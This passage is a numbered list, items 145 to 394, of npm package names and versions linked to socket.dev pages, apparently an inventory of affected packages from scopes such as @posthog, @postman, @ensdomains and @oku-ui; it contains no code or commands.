145. [@ensdomains/dnsprovejs](https://socket.dev/npm/package/@ensdomains/dnsprovejs/overview/0.5.3) (v0.5.3)
146. [@ensdomains/dnssec-oracle-anchors](https://socket.dev/npm/package/@ensdomains/dnssec-oracle-anchors/overview/0.0.2) (v0.0.2)
147. [@ensdomains/dnssecoraclejs](https://socket.dev/npm/package/@ensdomains/dnssecoraclejs/overview/0.2.9) (v0.2.9)
148. [@ensdomains/durin](https://socket.dev/npm/package/@ensdomains/durin/overview/0.1.2) (v0.1.2)
149. [@ensdomains/durin-middleware](https://socket.dev/npm/package/@ensdomains/durin-middleware/overview/0.0.2) (v0.0.2)
150. [@ensdomains/ens-archived-contracts](https://socket.dev/npm/package/@ensdomains/ens-archived-contracts/overview/0.0.3) (v0.0.3)
151. [@ensdomains/ens-avatar](https://socket.dev/npm/package/@ensdomains/ens-avatar/overview/1.0.4) (v1.0.4)
152. [@ensdomains/ens-contracts](https://socket.dev/npm/package/@ensdomains/ens-contracts/overview/1.6.1) (v1.6.1)
153. [@ensdomains/ens-test-env](https://socket.dev/npm/package/@ensdomains/ens-test-env/overview/1.0.2) (v1.0.2)
154. [@ensdomains/ens-validation](https://socket.dev/npm/package/@ensdomains/ens-validation/overview/0.1.1) (v0.1.1)
155. [@ensdomains/ensjs](https://socket.dev/npm/package/@ensdomains/ensjs/overview/4.0.3) (v4.0.3)
156. [@ensdomains/ensjs-react](https://socket.dev/npm/package/@ensdomains/ensjs-react/overview/0.0.5) (v0.0.5)
157. [@ensdomains/eth-ens-namehash](https://socket.dev/npm/package/@ensdomains/eth-ens-namehash/overview/2.0.16) (v2.0.16)
158. [@ensdomains/hackathon-registrar](https://socket.dev/npm/package/@ensdomains/hackathon-registrar/overview/1.0.5) (v1.0.5)
159. [@ensdomains/hardhat-chai-matchers-viem](https://socket.dev/npm/package/@ensdomains/hardhat-chai-matchers-viem/overview/0.1.15) (v0.1.15)
160. [@ensdomains/hardhat-toolbox-viem-extended](https://socket.dev/npm/package/@ensdomains/hardhat-toolbox-viem-extended/overview/0.0.6) (v0.0.6)
161. [@ensdomains/mock](https://socket.dev/npm/package/@ensdomains/mock/overview/2.1.52) (v2.1.52)
162. [@ensdomains/name-wrapper](https://socket.dev/npm/package/@ensdomains/name-wrapper/overview/1.0.1) (v1.0.1)
163. [@ensdomains/offchain-resolver-contracts](https://socket.dev/npm/package/@ensdomains/offchain-resolver-contracts/overview/0.2.2) (v0.2.2)
164. [@ensdomains/op-resolver-contracts](https://socket.dev/npm/package/@ensdomains/op-resolver-contracts/overview/0.0.2) (v0.0.2)
165. [@ensdomains/react-ens-address](https://socket.dev/npm/package/@ensdomains/react-ens-address/overview/0.0.32) (v0.0.32)
166. [@ensdomains/renewal](https://socket.dev/npm/package/@ensdomains/renewal/overview/0.0.13) (v0.0.13)
167. [@ensdomains/renewal-widget](https://socket.dev/npm/package/@ensdomains/renewal-widget/overview/0.1.10) (v0.1.10)
168. [@ensdomains/reverse-records](https://socket.dev/npm/package/@ensdomains/reverse-records/overview/1.0.1) (v1.0.1)
169. [@ensdomains/server-analytics](https://socket.dev/npm/package/@ensdomains/server-analytics/overview/0.0.2) (v0.0.2)
170. [@ensdomains/solsha1](https://socket.dev/npm/package/@ensdomains/solsha1/overview/0.0.4) (v0.0.4)
171. [@ensdomains/subdomain-registrar](https://socket.dev/npm/package/@ensdomains/subdomain-registrar/overview/0.2.4) (v0.2.4)
172. [@ensdomains/test-utils](https://socket.dev/npm/package/@ensdomains/test-utils/overview/1.3.1) (v1.3.1)
173. [@ensdomains/thorin](https://socket.dev/npm/package/@ensdomains/thorin/overview/0.6.51) (v0.6.51)
174. [@ensdomains/ui](https://socket.dev/npm/package/@ensdomains/ui/overview/3.4.6) (v3.4.6)
175. [@ensdomains/unicode-confusables](https://socket.dev/npm/package/@ensdomains/unicode-confusables/overview/0.1.1) (v0.1.1)
176. [@ensdomains/unruggable-gateways](https://socket.dev/npm/package/@ensdomains/unruggable-gateways/overview/0.0.3) (v0.0.3)
177. [@ensdomains/vite-plugin-i18next-loader](https://socket.dev/npm/package/@ensdomains/vite-plugin-i18next-loader/overview/4.0.4) (v4.0.4)
178. [@ensdomains/web3modal](https://socket.dev/npm/package/@ensdomains/web3modal/overview/1.10.2) (v1.10.2)
179. [@everreal/react-charts](https://socket.dev/npm/package/@everreal/react-charts/overview/2.0.1) (v2.0.1)
180. [@everreal/react-charts](https://socket.dev/npm/package/@everreal/react-charts/overview/2.0.2) (v2.0.2)
181. [@everreal/validate-esmoduleinterop-imports](https://socket.dev/npm/package/@everreal/validate-esmoduleinterop-imports/overview/1.4.5) (v1.4.4, v1.4.5)
182. [@everreal/web-analytics](https://socket.dev/npm/package/@everreal/web-analytics/overview/0.0.2) (v0.0.1, v0.0.2)
183. [@faq-component/core](https://socket.dev/npm/package/@faq-component/core/overview/0.0.4) (v0.0.4)
184. [@faq-component/react](https://socket.dev/npm/package/@faq-component/react/overview/1.0.1) (v1.0.1)
185. [@fishingbooker/browser-sync-plugin](https://socket.dev/npm/package/@fishingbooker/browser-sync-plugin/overview/1.0.5) (v1.0.5)
186. [@fishingbooker/react-loader](https://socket.dev/npm/package/@fishingbooker/react-loader/overview/1.0.7) (v1.0.7)
187. [@fishingbooker/react-pagination](https://socket.dev/npm/package/@fishingbooker/react-pagination/overview/2.0.6) (v2.0.6)
188. [@fishingbooker/react-raty](https://socket.dev/npm/package/@fishingbooker/react-raty/overview/2.0.1) (v2.0.1)
189. [@fishingbooker/react-swiper](https://socket.dev/npm/package/@fishingbooker/react-swiper/overview/0.1.5) (v0.1.5)
190. [@hapheus/n8n-nodes-pgp](https://socket.dev/npm/package/@hapheus/n8n-nodes-pgp/overview/1.5.1) (v1.5.1)
191. [@hover-design/core](https://socket.dev/npm/package/@hover-design/core/overview/0.0.1) (v0.0.1)
192. [@hover-design/react](https://socket.dev/npm/package/@hover-design/react/overview/0.2.1) (v0.2.1)
193. [@huntersofbook/auth-vue](https://socket.dev/npm/package/@huntersofbook/auth-vue) (v0.4.2)
194. [@huntersofbook/core](https://socket.dev/npm/package/@huntersofbook/core) (v0.5.1)
195. [@huntersofbook/core-nuxt](https://socket.dev/npm/package/@huntersofbook/core-nuxt) (v0.4.2)
196. [@huntersofbook/form-naiveui](https://socket.dev/npm/package/@huntersofbook/form-naiveui/overview/0.5.1) (v0.5.1)
197. [@huntersofbook/i18n](https://socket.dev/npm/package/@huntersofbook/i18n) (v0.8.2)
198. [@huntersofbook/ui](https://socket.dev/npm/package/@huntersofbook/ui) (v0.5.1)
199. [@hyperlook/telemetry-sdk ](https://socket.dev/npm/package/@hyperlook/telemetry-sdk/files/1.0.19)(v1.0.19)
200. [@ifelsedeveloper/protocol-contracts-svm-idl](https://socket.dev/npm/package/@ifelsedeveloper/protocol-contracts-svm-idl/overview/0.1.2) (v0.1.2)
201. [@ifelsedeveloper/protocol-contracts-svm-idl](https://socket.dev/npm/package/@ifelsedeveloper/protocol-contracts-svm-idl) (v0.1.3)
202. [@ifings/design-system](http://socket.dev/npm/package/@ifings/design-system/files/4.9.2) (v4.9.2)
203. [@ifings/metatron3](https://socket.dev/npm/package/@ifings/metatron3/overview/0.1.5) (v0.1.5)
204. [@jayeshsadhwani/telemetry-sdk](https://socket.dev/npm/package/@jayeshsadhwani/telemetry-sdk) (v1.0.14)
205. [@kvytech/cli](https://socket.dev/npm/package/@kvytech/cli/files/0.0.7) (v0.0.7)
206. [@kvytech/components](https://socket.dev/npm/package/@kvytech/components/overview/0.0.2) (v0.0.2)
207. [@kvytech/habbit-e2e-test](https://socket.dev/npm/package/@kvytech/habbit-e2e-test/overview/0.0.2) (v0.0.2)
208. [@kvytech/medusa-plugin-announcement](https://socket.dev/npm/package/@kvytech/medusa-plugin-announcement/overview/0.0.8) (v0.0.8)
209. [@kvytech/medusa-plugin-management](https://socket.dev/npm/package/@kvytech/medusa-plugin-management/overview/0.0.5) (v0.0.5)
210. [@kvytech/medusa-plugin-newsletter](https://socket.dev/npm/package/@kvytech/medusa-plugin-newsletter/overview/0.0.5) (v0.0.5)
211. [@kvytech/medusa-plugin-product-reviews](https://socket.dev/npm/package/@kvytech/medusa-plugin-product-reviews/overview/0.0.9) (v0.0.9)
212. [@kvytech/medusa-plugin-promotion](https://socket.dev/npm/package/@kvytech/medusa-plugin-promotion/overview/0.0.2) (v0.0.2)
213. [@kvytech/web](https://socket.dev/npm/package/@kvytech/web/overview/0.0.2) (v0.0.2)
214. [@lessondesk/api-client](https://socket.dev/npm/package/@lessondesk/api-client/overview/9.12.2) (v9.12.2)
215. [@lessondesk/api-client](https://socket.dev/npm/package/@lessondesk/api-client/overview/9.12.3) (v9.12.3)
216. [@lessondesk/babel-preset](https://socket.dev/npm/package/@lessondesk/babel-preset/overview/1.0.1) (v1.0.1)
217. [@lessondesk/electron-group-api-client](https://socket.dev/npm/package/@lessondesk/electron-group-api-client/overview/1.0.3) (v1.0.3)
218. [@lessondesk/eslint-config](https://socket.dev/npm/package/@lessondesk/eslint-config/overview/1.4.2) (v1.4.2)
219. [@lessondesk/material-icons](https://socket.dev/npm/package/@lessondesk/material-icons/overview/1.0.3) (v1.0.3)
220. [@lessondesk/react-table-context](https://socket.dev/npm/package/@lessondesk/react-table-context/overview/2.0.4) (v2.0.4)
221. [@lessondesk/schoolbus](https://socket.dev/npm/package/@lessondesk/schoolbus/overview/5.2.3) (v5.2.2, v5.2.3)
222. [@livecms/live-edit](https://socket.dev/npm/package/@livecms/live-edit) (v0.0.32)
223. [@livecms/nuxt-live-edit](https://socket.dev/npm/package/@livecms/nuxt-live-edit) (v1.9.2)
224. [@lokeswari-satyanarayanan/rn-zustand-expo-template](https://socket.dev/npm/package/@lokeswari-satyanarayanan/rn-zustand-expo-template) (v1.0.9)
225. [@louisle2/core](https://socket.dev/npm/package/@louisle2/core/overview/1.0.1) (v1.0.1)
226. [@louisle2/cortex-js](https://socket.dev/npm/package/@louisle2/cortex-js/overview/0.1.6) (v0.1.6)
227. [@lpdjs/firestore-repo-service](https://socket.dev/npm/package/@lpdjs/firestore-repo-service/overview/1.0.1) (v1.0.1)
228. [@lui-ui/lui-nuxt](https://socket.dev/npm/package/@lui-ui/lui-nuxt) (v0.1.1)
229. [@lui-ui/lui-tailwindcss](https://socket.dev/npm/package/@lui-ui/lui-tailwindcss) (v0.1.2)
230. [@lui-ui/lui-vue](https://socket.dev/npm/package/@lui-ui/lui-vue) (v1.0.13)
231. [@markvivanco/app-version-checker](https://socket.dev/npm/package/@markvivanco/app-version-checker/overview/1.0.2) (v1.0.1, v1.0.2)
232. [@mcp-use/cli](https://socket.dev/npm/package/@mcp-use/cli/overview/2.2.7) (v2.2.6, v2.2.7)
233. [@mcp-use/inspector](https://socket.dev/npm/package/@mcp-use/inspector/overview/0.6.2) (v0.6.2, v0.6.3)
234. [@mcp-use/mcp-use](https://socket.dev/npm/package/@mcp-use/mcp-use/overview/1.0.2) (v1.0.1, v1.0.2)
235. [@micado-digital/stadtmarketing-kufstein-external](https://socket.dev/npm/package/@micado-digital/stadtmarketing-kufstein-external) (v1.9.1)
236. [@mizzle-dev/orm](https://socket.dev/npm/package/@mizzle-dev/orm) (v0.0.2)
237. [@ntnx/passport-wso2](https://socket.dev/npm/package/@ntnx/passport-wso2/overview/0.0.3) (v0.0.3)
238. [@ntnx/t](https://socket.dev/npm/package/@ntnx/t/overview/0.0.101) (v0.0.101)
239. [@oku-ui/accordion](https://socket.dev/npm/package/@oku-ui/accordion) (v0.6.2)
240. [@oku-ui/alert-dialog](https://socket.dev/npm/package/@oku-ui/alert-dialog) (v0.6.2)
241. [@oku-ui/arrow](https://socket.dev/npm/package/@oku-ui/arrow/files/0.6.2) (v0.6.2)
242. [@oku-ui/aspect-ratio](https://socket.dev/npm/package/@oku-ui/aspect-ratio) (v0.6.2)
243. [@oku-ui/avatar](https://socket.dev/npm/package/@oku-ui/avatar) (v0.6.2)
244. [@oku-ui/checkbox](https://socket.dev/npm/package/@oku-ui/checkbox) (v0.6.3)
245. [@oku-ui/collapsible](https://socket.dev/npm/package/@oku-ui/collapsible) (v0.6.2)
246. [@oku-ui/collection](https://socket.dev/npm/package/@oku-ui/collection) (v0.6.2)
247. [@oku-ui/dialog](https://socket.dev/npm/package/@oku-ui/dialog) (v0.6.2)
248. [@oku-ui/direction](https://socket.dev/npm/package/@oku-ui/direction) (v0.6.2)
249. [@oku-ui/dismissable-layer](https://socket.dev/npm/package/@oku-ui/dismissable-layer) (v0.6.2)
250. [@oku-ui/focus-guards](https://socket.dev/npm/package/@oku-ui/focus-guards) (v0.6.2)
251. [@oku-ui/focus-scope](https://socket.dev/npm/package/@oku-ui/focus-scope) (v0.6.2)
252. [@oku-ui/hover-card](https://socket.dev/npm/package/@oku-ui/hover-card) (v0.6.2)
253. [@oku-ui/label](https://socket.dev/npm/package/@oku-ui/label) (v0.6.2)
254. [@oku-ui/menu](https://socket.dev/npm/package/@oku-ui/menu) (v0.6.2)
255. [@oku-ui/motion](https://socket.dev/npm/package/@oku-ui/motion) (v0.4.4)
256. [@oku-ui/motion-nuxt](https://socket.dev/npm/package/@oku-ui/motion-nuxt) (v0.2.2)
257. [@oku-ui/popover](https://socket.dev/npm/package/@oku-ui/popover) (v0.6.2)
258. [@oku-ui/popper](https://socket.dev/npm/package/@oku-ui/popper) (v0.6.2)
259. [@oku-ui/portal](https://socket.dev/npm/package/@oku-ui/portal) (v0.6.2)
260. [@oku-ui/presence](https://socket.dev/npm/package/@oku-ui/presence) (v0.6.2)
261. [@oku-ui/primitive](https://socket.dev/npm/package/@oku-ui/primitive) (v0.6.2)
262. [@oku-ui/primitives](https://socket.dev/npm/package/@oku-ui/primitives) (v0.7.9)
263. [@oku-ui/primitives-nuxt](https://socket.dev/npm/package/@oku-ui/primitives-nuxt) (v0.3.1)
264. [@oku-ui/progress](https://socket.dev/npm/package/@oku-ui/progress) (v0.6.2)
265. [@oku-ui/provide](https://socket.dev/npm/package/@oku-ui/provide) (v0.6.2)
266. [@oku-ui/radio-group](https://socket.dev/npm/package/@oku-ui/radio-group) (v0.6.2)
267. [@oku-ui/roving-focus](https://socket.dev/npm/package/@oku-ui/roving-focus) (v0.6.2)
268. [@oku-ui/scroll-area](https://socket.dev/npm/package/@oku-ui/scroll-area) (v0.6.2)
269. [@oku-ui/separator](https://socket.dev/npm/package/@oku-ui/separator) (v0.6.2)
270. [@oku-ui/slider](https://socket.dev/npm/package/@oku-ui/slider) (v0.6.2)
271. [@oku-ui/slot](https://socket.dev/npm/package/@oku-ui/slot/files/0.6.2) (v0.6.2)
272. [@oku-ui/switch](https://socket.dev/npm/package/@oku-ui/switch) (v0.6.2)
273. [@oku-ui/tabs](https://socket.dev/npm/package/@oku-ui/tabs) (v0.6.2)
274. [@oku-ui/toast](https://socket.dev/npm/package/@oku-ui/toast) (v0.6.2)
275. [@oku-ui/toggle](https://socket.dev/npm/package/@oku-ui/toggle) (v0.6.2)
276. [@oku-ui/toggle-group](https://socket.dev/npm/package/@oku-ui/toggle-group/overview/0.6.2) (v0.6.2)
277. [@oku-ui/toolbar](https://socket.dev/npm/package/@oku-ui/toolbar) (v0.6.2)
278. [@oku-ui/tooltip](https://socket.dev/npm/package/@oku-ui/tooltip/files/0.6.2) (v0.6.2)
279. [@oku-ui/use-composable](https://socket.dev/npm/package/@oku-ui/use-composable) (v0.6.2)
280. [@oku-ui/utils](https://socket.dev/npm/package/@oku-ui/utils) (v0.6.2)
281. [@oku-ui/visually-hidden](https://socket.dev/npm/package/@oku-ui/visually-hidden) (v0.6.2)
282. [@orbitgtbelgium/mapbox-gl-draw-cut-polygon-mode](https://socket.dev/npm/package/@orbitgtbelgium/mapbox-gl-draw-cut-polygon-mode/overview/2.0.5) (v2.0.5)
283. [@orbitgtbelgium/mapbox-gl-draw-scale-rotate-mode](https://socket.dev/npm/package/@orbitgtbelgium/mapbox-gl-draw-scale-rotate-mode/overview/1.1.1) (v1.1.1)
284. [@orbitgtbelgium/orbit-components](https://socket.dev/npm/package/@orbitgtbelgium/orbit-components/overview/1.2.9) (v1.2.9)
285. [@orbitgtbelgium/time-slider](https://socket.dev/npm/package/@orbitgtbelgium/time-slider/overview/1.0.187) (v1.0.187)
286. [@osmanekrem/bmad](https://socket.dev/npm/package/@osmanekrem/bmad/overview/1.0.6) (v1.0.6)
287. [@osmanekrem/error-handler](https://socket.dev/npm/package/@osmanekrem/error-handler/overview/1.2.2) (v1.2.2)
288. [@pergel/cli](https://socket.dev/npm/package/@pergel/cli) (v0.11.1)
289. [@pergel/module-box](https://socket.dev/npm/package/@pergel/module-box) (v0.6.1)
290. [@pergel/module-graphql](https://socket.dev/npm/package/@pergel/module-graphql/overview/0.6.1) (v0.6.1)
291. [@pergel/module-ui](https://socket.dev/npm/package/@pergel/module-ui) (v0.0.9)
292. [@pergel/nuxt](https://socket.dev/npm/package/@pergel/nuxt) (v0.25.5)
293. [@posthog/agent](https://socket.dev/npm/package/@posthog/agent/overview/1.24.1) (v1.24.1)
294. [@posthog/ai ](https://socket.dev/npm/package/@posthog/ai/files/7.1.2)(v7.1.2)
295. [@posthog/automatic-cohorts-plugin](https://socket.dev/npm/package/@posthog/automatic-cohorts-plugin/overview/0.0.8) (v0.0.8)
296. [@posthog/bitbucket-release-tracker](https://socket.dev/npm/package/@posthog/bitbucket-release-tracker/overview/0.0.8) (v0.0.8)
297. [@posthog/cli](https://socket.dev/npm/package/@posthog/cli/overview/0.5.15) (v0.5.15)
298. [@posthog/clickhouse](https://socket.dev/npm/package/@posthog/clickhouse/overview/1.7.1) (v1.7.1)
299. [@posthog/core](https://socket.dev/npm/package/@posthog/core/overview/1.5.6) (v1.5.6)
300. [@posthog/currency-normalization-plugin](https://socket.dev/npm/package/@posthog/currency-normalization-plugin/overview/0.0.8) (v0.0.8)
301. [@posthog/customerio-plugin](https://socket.dev/npm/package/@posthog/customerio-plugin/overview/0.0.8) (v0.0.8)
302. [@posthog/databricks-plugin](https://socket.dev/npm/package/@posthog/databricks-plugin/overview/0.0.8) (v0.0.8)
303. [@posthog/drop-events-on-property-plugin](https://socket.dev/npm/package/@posthog/drop-events-on-property-plugin/overview/0.0.8) (v0.0.8)
304. [@posthog/event-sequence-timer-plugin](https://socket.dev/npm/package/@posthog/event-sequence-timer-plugin/overview/0.0.8) (v0.0.8)
305. [@posthog/filter-out-plugin](https://socket.dev/npm/package/@posthog/filter-out-plugin/overview/0.0.8) (v0.0.8)
306. [@posthog/first-time-event-tracker](https://socket.dev/npm/package/@posthog/first-time-event-tracker/overview/0.0.8) (v0.0.8)
307. [@posthog/geoip-plugin](https://socket.dev/npm/package/@posthog/geoip-plugin/overview/0.0.8) (v0.0.8)
308. [@posthog/github-release-tracking-plugin](https://socket.dev/npm/package/@posthog/github-release-tracking-plugin/overview/0.0.8) (v0.0.8)
309. [@posthog/gitub-star-sync-plugin](https://socket.dev/npm/package/@posthog/gitub-star-sync-plugin/overview/0.0.8) (v0.0.8)
310. [@posthog/heartbeat-plugin](https://socket.dev/npm/package/@posthog/heartbeat-plugin/overview/0.0.8) (v0.0.8)
311. [@posthog/hedgehog-mode](https://socket.dev/npm/package/@posthog/hedgehog-mode/overview/0.0.42) (v0.0.42)
312. [@posthog/icons](https://socket.dev/npm/package/@posthog/icons/overview/0.36.1) (v0.36.1)
313. [@posthog/ingestion-alert-plugin](https://socket.dev/npm/package/@posthog/ingestion-alert-plugin/overview/0.0.8) (v0.0.8)
314. [@posthog/intercom-plugin](https://socket.dev/npm/package/@posthog/intercom-plugin/overview/0.0.8) (v0.0.8)
315. [@posthog/kinesis-plugin](https://socket.dev/npm/package/@posthog/kinesis-plugin/overview/0.0.8) (v0.0.8)
316. [@posthog/laudspeaker-plugin](https://socket.dev/npm/package/@posthog/laudspeaker-plugin/overview/0.0.8) (v0.0.8)
317. [@posthog/lemon-ui](http://v/) (v0.0.1)
318. [@posthog/maxmind-plugin](https://socket.dev/npm/package/@posthog/maxmind-plugin/overview/0.1.6) (v0.1.6)
319. [@posthog/migrator3000-plugin](https://socket.dev/npm/package/@posthog/migrator3000-plugin/overview/0.0.8) (v0.0.8)
320. [@posthog/netdata-event-processing](https://socket.dev/npm/package/@posthog/netdata-event-processing/overview/0.0.8) (v0.0.8)
321. [@posthog/nextjs](https://socket.dev/npm/package/@posthog/nextjs/overview/0.0.3) (v0.0.3)
322. [@posthog/nextjs-config](https://socket.dev/npm/package/@posthog/nextjs-config/overview/1.5.1) (v1.5.1)
323. [@posthog/nuxt](https://socket.dev/npm/package/@posthog/nuxt/overview/1.2.9) (v1.2.9)
324. [@posthog/pagerduty-plugin](https://socket.dev/npm/package/@posthog/pagerduty-plugin/overview/0.0.8) (v0.0.8)
325. [@posthog/piscina](https://socket.dev/npm/package/@posthog/piscina/overview/3.2.1) (v3.2.1)
326. [@posthog/plugin-contrib](https://socket.dev/npm/package/@posthog/plugin-contrib/overview/0.0.6) (v0.0.6)
327. [@posthog/plugin-server](https://socket.dev/npm/package/@posthog/plugin-server/overview/1.10.8) (v1.10.8)
328. [@posthog/plugin-unduplicates](https://socket.dev/npm/package/@posthog/plugin-unduplicates/overview/0.0.8) (v0.0.8)
329. [@postman/pm-bin-linux-x64](https://socket.dev/npm/package/@postman/pm-bin-linux-x64/overview/1.24.3) (v1.24.3)
330. [@postman/pm-bin-linux-x64](https://socket.dev/npm/package/@postman/pm-bin-linux-x64/overview/1.24.4) (v1.24.4)
331. [@postman/pm-bin-linux-x64](https://socket.dev/npm/package/@postman/pm-bin-linux-x64/overview/1.24.5) (v1.24.5)
332. [@posthog/postgres-plugin](https://socket.dev/npm/package/@posthog/postgres-plugin/overview/0.0.8) (v0.0.8)
333. [@posthog/react-rrweb-player](https://socket.dev/npm/package/@posthog/react-rrweb-player/overview/1.1.4) (v1.1.4)
334. [@posthog/rrdom ](https://socket.dev/npm/package/@posthog/rrdom/overview/0.0.31)(v0.0.31)
335. [@posthog/rrweb](https://socket.dev/npm/package/@posthog/rrweb/overview/0.0.31) (v0.0.31)
336. [@posthog/rrweb-player](https://socket.dev/npm/package/@posthog/rrweb-player/overview/0.0.31) (v0.0.31)
337. [@posthog/rrweb-record](https://socket.dev/npm/package/@posthog/rrweb-record/overview/0.0.31) (v0.0.31)
338. [@posthog/rrweb-replay](https://socket.dev/npm/package/@posthog/rrweb-replay/overview/0.0.19) (v0.0.19)
339. [@posthog/rrweb-snapshot](https://socket.dev/npm/package/@posthog/rrweb-snapshot/overview/0.0.31) (v0.0.31)
340. [@posthog/rrweb-utils](https://socket.dev/npm/package/@posthog/rrweb-utils/overview/0.0.31) (v0.0.31)
341. [@posthog/sendgrid-plugin](https://socket.dev/npm/package/@posthog/sendgrid-plugin/overview/0.0.8) (v0.0.8)
342. [@posthog/siphash](https://socket.dev/npm/package/@posthog/siphash/overview/1.1.2) (v1.1.2)
343. [@posthog/snowflake-export-plugin](https://socket.dev/npm/package/@posthog/snowflake-export-plugin/overview/0.0.8) (v0.0.8)
344. [@posthog/taxonomy-plugin](https://socket.dev/npm/package/@posthog/taxonomy-plugin/overview/0.0.8) (v0.0.8)
345. [@posthog/twilio-plugin](https://socket.dev/npm/package/@posthog/twilio-plugin/overview/0.0.8) (v0.0.8)
346. [@posthog/twitter-followers-plugin](https://socket.dev/npm/package/@posthog/twitter-followers-plugin/overview/0.0.8) (v0.0.8)
347. [@posthog/url-normalizer-plugin](https://socket.dev/npm/package/@posthog/url-normalizer-plugin/overview/0.0.8) (v0.0.8)
348. [@posthog/variance-plugin](https://socket.dev/npm/package/@posthog/variance-plugin/overview/0.0.8) (v0.0.8)
349. [@posthog/web-dev-server](https://socket.dev/npm/package/@posthog/web-dev-server/overview/1.0.5) (v1.0.5)
350. [@posthog/wizard](https://socket.dev/npm/package/@posthog/wizard/overview/1.18.1) (v1.18.1)
351. [@posthog/zendesk-plugin](https://socket.dev/npm/package/@posthog/zendesk-plugin/overview/0.0.8) (v0.0.8)
352. [@postman/aether-icons](https://socket.dev/npm/package/@postman/aether-icons/overview/2.23.4) (v2.23.2, v2.23.3, v2.23.4)
353. [@postman/csv-parse](https://socket.dev/npm/package/@postman/csv-parse/overview/4.0.5) (v4.0.3, v4.0.4, v4.0.5)
354. [@postman/final-node-keytar](https://socket.dev/npm/package/@postman/final-node-keytar/overview/7.9.3) (v7.9.1, v7.9.2, v7.9.3)
355. [@postman/mcp-ui-client](https://socket.dev/npm/package/@postman/mcp-ui-client/overview/5.5.3) (v5.5.1, v5.5.2, v5.5.3)
356. [@postman/node-keytar](https://socket.dev/npm/package/@postman/node-keytar/overview/7.9.6) (v7.9.4, v7.9.5, v7.9.6)
357. [@postman/pm-bin-linux-x64](https://socket.dev/npm/package/@postman/pm-bin-linux-x64/overview/1.24.5) (v1.24.4, v1.24.5)
358. [@postman/pm-bin-macos-arm64](https://socket.dev/npm/package/@postman/pm-bin-macos-arm64/overview/1.24.5) (v1.24.3, v1.24.4, v1.24.5)
359. [@postman/pm-bin-macos-x64](https://socket.dev/npm/package/@postman/pm-bin-macos-x64/overview/1.24.4) (v1.24.3, v1.24.4)
360. [@postman/pm-bin-windows-x64](https://socket.dev/npm/package/@postman/pm-bin-windows-x64/overview/1.24.5) (v1.24.3, v1.24.4, v1.24.5)
361. [@postman/postman-collection-fork](https://socket.dev/npm/package/@postman/postman-collection-fork/overview/4.3.5) (v4.3.3, v4.3.4, v4.3.5)
362. [@postman/postman-mcp-cli](https://socket.dev/npm/package/@postman/postman-mcp-cli/overview/1.0.5) (v1.0.3, v1.0.4, v1.0.5)
363. [@postman/postman-mcp-server](https://socket.dev/npm/package/@postman/postman-mcp-server/overview/2.4.12) (v2.4.10, v2.4.11, v2.4.12)
364. [@postman/pretty-ms](https://socket.dev/npm/package/@postman/pretty-ms/overview/6.1.3) (v6.1.1, v6.1.2, v6.1.3)
365. [@postman/secret-scanner-wasm](https://socket.dev/npm/package/@postman/secret-scanner-wasm/overview/2.1.4) (v2.1.2, v2.1.3, v2.1.4)
366. [@postman/tunnel-agent](https://socket.dev/npm/package/@postman/tunnel-agent/overview/0.6.7) (v0.6.5, v0.6.6, v0.6.7)
367. [@postman/wdio-allure-reporter](https://socket.dev/npm/package/@postman/wdio-allure-reporter/overview/0.0.9) (v0.0.7, v0.0.8, v0.0.9)
368. [@postman/wdio-junit-reporter](https://socket.dev/npm/package/@postman/wdio-junit-reporter/overview/0.0.6) (v0.0.4, v0.0.5, v0.0.6)
369. [@pradhumngautam/common-app](https://socket.dev/npm/package/@pradhumngautam/common-app/overview/1.0.2) (v1.0.2)
370. [@productdevbook/animejs-vue](https://socket.dev/npm/package/@productdevbook/animejs-vue) (v0.2.1)
371. [@productdevbook/auth](https://socket.dev/npm/package/@productdevbook/auth/overview/0.2.2) (v0.2.2)
372. [@productdevbook/chatwoot](https://socket.dev/npm/package/@productdevbook/chatwoot/overview/2.0.1) (v2.0.1)
373. [@productdevbook/motion](https://socket.dev/npm/package/@productdevbook/motion/overview/1.0.4) (v1.0.4)
374. [@productdevbook/ts-i18n](https://socket.dev/npm/package/@productdevbook/ts-i18n/files/1.4.2) (v1.4.2)
375. [@pruthvi21/use-debounce](https://socket.dev/npm/package/@pruthvi21/use-debounce/overview/1.0.3) (v1.0.3)
376. [@quick-start-soft/quick-document-translator](https://socket.dev/npm/package/@quick-start-soft/quick-document-translator) (v1.4.2511142126)
377. [@quick-start-soft/quick-git-clean-markdown](https://socket.dev/npm/package/@quick-start-soft/quick-git-clean-markdown) (v1.4.2511142126)
378. [@quick-start-soft/quick-markdown](https://socket.dev/npm/package/@quick-start-soft/quick-markdown/files/1.4.2511142126/bun_environment.js) (v1.4.2511142126)
379. [@quick-start-soft/quick-markdown-compose](https://socket.dev/npm/package/@quick-start-soft/quick-markdown-compose) (v1.4.2506300029)
380. [@quick-start-soft/quick-markdown-image](https://socket.dev/npm/package/@quick-start-soft/quick-markdown-image) (v1.4.2511142126)
381. [@quick-start-soft/quick-markdown-print ](https://socket.dev/npm/package/@quick-start-soft/quick-markdown-print/files/1.4.2511142126/bun_environment.js)(v1.4.2511142126)
382. [@quick-start-soft/quick-markdown-translator](https://socket.dev/npm/package/@quick-start-soft/quick-markdown-translator) (v1.4.2509202331)
383. [@quick-start-soft/quick-remove-image-background](https://socket.dev/npm/package/@quick-start-soft/quick-remove-image-background) (v1.4.2511142126)
384. [@quick-start-soft/quick-task-refine](https://socket.dev/npm/package/@quick-start-soft/quick-task-refine) (v1.4.2511142126)
385. [@relyt/claude-context-core](https://socket.dev/npm/package/@relyt/claude-context-core/overview/0.1.1) (v0.1.1)
386. [@relyt/claude-context-mcp](https://socket.dev/npm/package/@relyt/claude-context-mcp/overview/0.1.1) (v0.1.1)
387. [@relyt/mcp-server-relytone](https://socket.dev/npm/package/@relyt/mcp-server-relytone/overview/0.0.3) (v0.0.3)
388. [@sameepsi/sor](https://socket.dev/npm/package/@sameepsi/sor) (v1.0.3, v2.0.2)
389. [@sameepsi/sor2](https://socket.dev/npm/package/@sameepsi/sor2/overview/2.0.2) (v2.0.2)
390. [@seezo/sdr-mcp-server](https://socket.dev/npm/package/@seezo/sdr-mcp-server/overview/0.0.5) (v0.0.5)
391. [@seung-ju/next](https://socket.dev/npm/package/@seung-ju/next/overview/0.0.2) (v0.0.2)
392. [@seung-ju/openapi-generator](https://socket.dev/npm/package/@seung-ju/openapi-generator/overview/0.0.4) (v0.0.4)
393. [@seung-ju/react-hooks](https://socket.dev/npm/package/@seung-ju/react-hooks/overview/0.0.2) (v0.0.2)
394. [@seung-ju/react-native-action-sheet](https://socket.dev/npm/package/@seung-ju/react-native-action-sheet/overview/0.2.1) (v0.2.1)
